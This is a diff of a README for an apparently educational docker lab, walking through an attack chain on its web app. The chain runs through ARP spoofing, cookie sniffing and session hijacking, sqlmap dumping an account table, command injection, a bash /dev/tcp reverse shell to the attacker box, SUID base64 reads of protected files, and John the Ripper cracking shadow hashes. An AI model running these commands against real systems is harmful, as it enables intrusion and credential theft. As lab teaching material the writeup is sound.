@@ -1,5 +1,16 @@
 # Network Security DSP
 
+## Usage
+
+Run the following docker commands
+
+```
+$ docker-compose build
+$ docker-compose up -d
+```
+
+## Writeup
+
 ### Machines
 * Web Application: http://127.0.0.1:8088
 * Attacker: http://127.0.0.1:7681
@@ -42,20 +53,26 @@ In computer networking, ARP spoofing, ARP cache poisoning, or ARP poison routing
 
 ## Cookie Stealing and Hijacking Session
 
-**:warning: IN THIS CASE, THE ATTACKER IS ASSUMED TO BE CONNECTED ON THE SAME NETWORK OF WEB APPLICATION.:warning:**
+**:warning: IN THIS CASE, THE ATTACKER IS ASSUMED TO BE CONNECTED ON THE SAME NETWORK OF WEB APPLICATION. :warning:**
 
 With the previous scan we discovered the IP address of the web application and of another endpoint, with which it is probably communicating.
 
 To carry out this attack it is necessary to enable ip forwarding with the systemcall:
-* **sysctl -w net.ipv4.ip_forward=1**
+```
+sysctl -w net.ipv4.ip_forward=1
+```
 (The attacker machine has been properly configured and there is no need for this command)
 
 Using this command, it's possible to check on which network interface the attacking machine receives communications:
-* **ip a**
+```
+ip a
+```
 
 Our purpose is to steal a possible session in order to access the service. To do this, we use the **arpspoof** command present in the **dsniff** suite of tools:
-* **arpspoof -i eth0 -t 193.20.1.5 193.20.1.2 2> /dev/null &**
-* **arpspoof -i eth0 -t 193.20.1.2 193.20.1.5 2> /dev/null &**
+```
+arpspoof -i eth0 -t 193.20.1.5 193.20.1.2 2> /dev/null &
+arpspoof -i eth0 -t 193.20.1.2 193.20.1.5 2> /dev/null &
+```
 
 In this way, the attacker is getting in the way of the communication between the server and the victim endpoint. If he wasn't connected to the internal network, it would have been necessary to intercept communications between the gateway and the other nodes on the network.
 
@@ -63,9 +80,12 @@ Now that we are intercepting the traffic, we need to use a tool to be able to re
 * https://www.tcpdump.org/
 
 To steal the session cookie, you can read the http packets' header using the following command:
-* **tcpdump -i eth0 -s 0 -A 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420'**
-	* **tcp[((tcp[12:1] & 0xf0) >> 2):4]**: first determines the location of the bytes you're interested in (after the TCP header) and then selects the 4bytes we wish to match against.
-	* **0x47455420**: depicts the ASCII value of the characters 'G' 'E' 'T' ' '
+```
+tcpdump -i eth0 -s 0 -A 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420'
+```
+
+* `tcp[((tcp[12:1] & 0xf0) >> 2):4]`: first determines the location of the bytes you're interested in (after the TCP header) and then selects the 4bytes we wish to match against.
+* `0x47455420`: depicts the ASCII value of the characters 'G' 'E' 'T' ' '
 
 In the output, you can notice that there is a cookie named **session**. If you're using **Firefox** right click on the application's login page and select **inspect**, after that select the **Storage** section and add a new cookie named "session" with the session value you've obtained before.
 
@@ -79,13 +99,15 @@ In this scenario, it is possible to search among the products in the database us
 * http://193.20.1.2:5000/search?nome=mela
 
 From the URL above, you can see that the results comes from the "nome" parameter in the query string. The web application needs to retreive the article from the database and may use an SQL statement that looks something like the following:
-* **SELECT all FROM table WHERE nome=mela**
+```sql
+SELECT all FROM table WHERE nome=mela
+```
 
 You can assume that this query is to search for stored products of a table. Is there a way to explore the other tables?
 
 ### Union-Based SQL Injection
 
-This type of injection utilises the **SQL UNION** operator alongside a **SELECT** statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.
+This type of injection utilises the `SQL UNION` operator alongside a `SELECT` statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.
 
 ### SQLMap
 
@@ -95,22 +117,31 @@ If you are using the attacking machine that was provided to you, sqlmap is alrea
 
 To check if the "name" parameter is vulnerable it is necessary to set the session (previously stolen) to allow sqlmap to see the /search page, to do this you need to use the following command:
 
-**sqlmap -u "http://193.20.1.2:5000/search?nome=mela" -p nome --cookie="session=STOLEN_SESSION"**
-* **-u**: Target Url
-* **-p**: Testable parameter(s)
-* **--cookie**: HTTP cookie header value
+```
+sqlmap -u "http://193.20.1.2:5000/search?nome=mela" -p nome --cookie="session=STOLEN_SESSION"
+```
+
+* `-u`: Target Url
+* `-p`: Testable parameter(s)
+* `--cookie`: HTTP cookie header value
 
 After that we can proceed to inspect the databases:
 
-**sqlmap -u "http://193.20.1.2:5000/search?nome=mela" -p nome --cookie="session=STOLEN_SESSION" --tables**
-* **--tables**: Enumerate DBMS database tables
+```
+sqlmap -u "http://193.20.1.2:5000/search?nome=mela" -p nome --cookie="session=STOLEN_SESSION" --tables
+```
+
+* `--tables`: Enumerate DBMS database tables
 
 It turns out that there is a database called "networkSecurity" with a table called "account". The last step is to see the contents of this table:
 
-**sqlmap -u "http://193.20.1.2:5000/search?nome=mela" -p nome --cookie="session=STOLEN_SESSION" -D networkSecurity -T account --dump**
-* **-D**: DBMS database to enumerate
-* **-T**: DBMS database table(s) to enumerate
-* **--dump**: Dump DBMS database table entries
+```
+sqlmap -u "http://193.20.1.2:5000/search?nome=mela" -p nome --cookie="session=STOLEN_SESSION" -D networkSecurity -T account --dump
+```
+
+* `-D`: DBMS database to enumerate
+* `-T`: DBMS database table(s) to enumerate
+* `--dump`: Dump DBMS database table entries
 
 ## Command Injection
 
@@ -118,19 +149,22 @@ It turns out that there is a database called "networkSecurity" with a table call
 
 Having logged in with the admin credentials, you are redirected to the /admin page. You may notice a form that says "*Explore your File System*", using this feature the admin can navigate through the folders containing the source codes for the web application. It is possible to assume that the web application uses a function to launch commands that will be executed by the shell.
 The command being executed probably looks something like this:
-* **"ls -l " + input**
+* `ls -l ` + input
 
 The current goal is to find a way to execute malicious commands by taking advantage of possible poor input validation, to do this we can use the pipe command.
 
 ### Pipe Command
-A pipe is an aspect of redirection i.e., transfer of any standard output to another target path which is commonly used in Unix and Linux-like operating systems in order to send the outputs of one process/command/program to another/program/command/process for any further processing. The Linux/Unix system enables stdout of a command to connect to stdin of other commands, which we can do by the pipe character ‘|.’
+A pipe is an aspect of redirection i.e., transfer of any standard output to another target path which is commonly used in Unix and Linux-like operating systems in order to send the outputs of one process/command/program to another/program/command/process for any further processing. The Linux/Unix system enables stdout of a command to connect to stdin of other commands, which we can do by the pipe character `|`.
 
 ### && Operator in Linux
 
 The Bash logical (&&) operator is one of the most useful commands that can be used in multiple ways, like you can use in the conditional statement or execute multiple commands simultaneously. Generally speaking, the logical operator is the one that is used to connect more than one expression and then provides the output based on their combined result.
 
 These are just some of the possible ways to chain multiple commands, you can do an initial test with the *whoami* command:
-* **ls -l | whoami**
+
+```
+ls -l | whoami
+```
 
 ### Reverse Shell
 To gain control over a compromised system, an attacker usually aims to gain interactive shell access for arbitrary command execution. With such access, they can try to elevate their privileges to obtain full control of the operating system. However, most systems are behind firewalls and direct remote shell connections are impossible. One of the methods used to circumvent this limitation is a reverse shell.
@@ -140,13 +174,22 @@ In a typical remote system access scenario, the user is the client and the targe
 The primary reason why reverse shells are often used by attackers is the way that most firewalls are configured. Attacked servers usually allow connections only on specific ports. For example, a dedicated web server will only accept connections on ports 80 and 443. This means that there is no possibility to establish a shell listener on the attacked server. On the other hand, firewalls usually do not limit outgoing connections at all. Therefore, an attacker may establish a server on their own machine and create a reverse connection. All that the attacker needs is a machine that has a public (routable) IP address and a tool such as netcat to create the listener and bind shell access to it.
 
 It is possible to have the server open a terminal to our attacking machine. To do this, you can open a shell to a remote address with a simple terminal command:
-* **bash -i >& /dev/tcp/IP_ADDRESS/PORT**
+
+```
+bash -i >& /dev/tcp/IP_ADDRESS/PORT
+```
 
 You need to listen on the attacking machine in order to accept the server connection. We use the netcat tool to do this:
-* **nc -lnvp PORT** (you can choose any free port)
+
+```
+nc -lnvp PORT (you can choose any free port)
+```
 
 Thanks to command injection, we can open a remote shell on our attacking machine by typing the command:
-* **bash -c "bash -i >& /dev/tcp/193.20.1.4/PORT 0>&1"**
+
+```
+bash -c "bash -i >& /dev/tcp/193.20.1.4/PORT 0>&1"
+```
 
 In this case, the server does not use the **/bin/bash** shell by default, so you need to invoke it with the **-c** flag to specify which command it should execute. If everything went well, the server will get stuck loading the page, and a remote shell will open on your terminal.
 
@@ -165,63 +208,91 @@ Enumeration is the first step you have to take once you gain access to any syste
 
 Shown below are some of the possible ways to get system information.
 
-* **uname -a**
+```
+uname -a
+```
 
 Will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation
 
-* **/proc/version**
+```
+/proc/version
+```
 
-Looking at /proc/version may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.
+Looking at `/proc/version` may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.
 
-* **ps Command**
+```
+ps
+```
 
-The **ps** command is an effective way to see the running processes on a Linux system. Typing ps on your terminal will show processes for the current shell. 
+The `ps` command is an effective way to see the running processes on a Linux system. Typing ps on your terminal will show processes for the current shell. 
 
-* **env**
+```
+env
+```
 
-The env command will show environmental variables. The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.
+The env command will show environmental variables. The `PATH` variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.
 
-* **sudo -l**
+```
+sudo -l
+```
 
-The target system may be configured to allow users to run some (or all) commands with root privileges. The sudo -l command can be used to list all commands your user can run using sudo.
+The target system may be configured to allow users to run some (or all) commands with root privileges. The `sudo -l` command can be used to list all commands your user can run using sudo.
 
-* **id**
+```
+id
+```
 
 The id command will provide a general overview of the user’s privilege level and group memberships. It is worth remembering that the id command can also be used to obtain the same information for another user as seen below.
 
-* **/etc/passwd**
+```
+/etc/passwd
+```
 
 Reading the /etc/passwd file can be an easy way to discover users on the system. 
 
-* **ifconfig**
+```
+ifconfig
+```
+
 
 The target system may be a pivoting point to another network. The ifconfig command will give us information about the network interfaces of the system. 
 
-* **netstat**
+```
+netstat
+```
 
 Following an initial check for existing interfaces and network routes, it is worth looking into existing communications. The netstat command can be used with several different options to gather information on existing connections. 
 
-* **find Command**
+```
+find
+```
 
-Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in “find” command is useful and worth keeping in your arsenal.
+Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in `find` command is useful and worth keeping in your arsenal.
 
 ### SUID
 Much of Linux's privilege checks rely on checking users and file interactions. This is done with permissions. By now you know that files can have read, write and execute permissions. These are provided to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow you to run files with the permission level of the file owner or group owner, respectively.
 
-You will notice these files have an “s” bit set showing their special permission level.
+You will notice these files have an `s` bit set showing their special permission level.
 
-**find / -type f -perm -04000 -ls 2>/dev/null** will list files that have SUID or SGID bits set.
+```
+find / -type f -perm -04000 -ls 2>/dev/null
+```
+
+It will list files that have SUID or SGID bits set.
 
 A good practice would be to compare executables on this list with GTFOBins (https://gtfobins.github.io). Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set. Unfortunately, GTFObins does not provide us with an easy win. Typical to real-life privilege escalation scenarios, we will need to find intermediate steps that will help us leverage whatever minuscule finding we have.
 
-We can notice that **base64** command has the bit **s** set. As you can read at the following link:
+We can notice that `base64` command has the bit `s` set. As you can read at the following link:
 * https://gtfobins.github.io/gtfobins/base64/#suid
 
 It is possible to read files on which the admin user doesn't have access permissions by running:
-* **base64 file | base64 -d**
+
+```
+base64 file | base64 -d
+```
 
 ## Cracking Password
-Linux systems use a password file to store accounts, commonly available as **/etc/passwd**. For additional safety measures, a shadow copy of this file is used which includes the passwords of your users. Or actually hashed password, for maximum security.
+Linux systems use a password file to store accounts, commonly available as `/etc/passwd`. For additional safety measures, a shadow copy of this file is used which includes the passwords of your users. Or actually hashed password, for maximum security.
 
 An example of a password entry in **/etc/shadow** may look like this:
 
@@ -271,7 +342,10 @@ If you are using the attacking machine that was provided to you, JtR is already 
 Once you have discovered the passwd and shadow files, you can try to find out the passwords of various users, especially the root user.
 
 First use the unshadow command to combines the /etc/passwd and /etc/shadow files so John can use them
-* **unshadow passwd shadow > unshadow**
+
+```
+unshadow passwd shadow > unshadow
+```
 
 On a normal system you’ll need to run unshadow as root to be able to read the shadow file. So login as root or use old good sudo / su command under Debian / Ubuntu Linux.
 
@@ -279,14 +353,19 @@ To use John, you just need to supply it a password file created using unshadow c
 
 The "rockyou" dictionary is already present on the attacker machine with some possible passwords to try. Also, in the shadow file we can see the **$1** symbol, this means that it has been hashed with MD5.
 
-* **john --wordlist=path/to/wordlist --format=MD5crypt unshadow**
-	* **--wordlist**: Wordlist mode, read words from FILE or stdin
-	* **--format**: Force the hash of the specified type
+```
+john --wordlist=path/to/wordlist --format=MD5crypt unshadow
+```
+
+* `--wordlist`: Wordlist mode, read words from FILE or stdin
+* `--format`: Force the hash of the specified type
 
 This procedure will take its own time. To see the cracked passwords, enter:
 
-* **john --show unshadow**
-	* **--show**: Show cracked passwords
+```
+john --show unshadow
+```
+* `--show`: Show cracked passwords
 
 If the root password is present in the dictionary used, it will be shown on the screen.
 
